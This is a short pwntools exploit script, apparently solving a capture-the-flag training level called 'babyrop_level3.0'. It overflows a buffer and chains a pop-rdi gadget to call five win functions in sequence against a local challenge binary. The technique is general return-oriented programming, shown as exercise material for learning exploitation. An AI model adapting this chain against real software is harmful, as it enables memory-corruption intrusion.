from pwn import *

offset = b'A'*104

win_stage_1 = p64(0x4023d9)
win_stage_2 = p64(0x402760)
win_stage_3 = p64(0x402598)
win_stage_4 = p64(0x40267a)
win_stage_5 = p64(0x4024b5)

poprdi_ret = p64(0x402b53)
ret = p64(0x40101a)

payload = offset
payload += ret
payload += poprdi_ret
payload += p64(1)
payload += win_stage_1
payload += poprdi_ret
payload += p64(2)
payload += win_stage_2
payload += poprdi_ret
payload += p64(3)
payload += win_stage_3
payload += poprdi_ret
payload += p64(4)
payload += win_stage_4
payload += poprdi_ret
payload += p64(5)
payload += win_stage_5
    
   
r = process('/challenge/babyrop_level3.0') 
r.recvuntil(b'return address).\n')
r.sendline(payload)
r.interactive()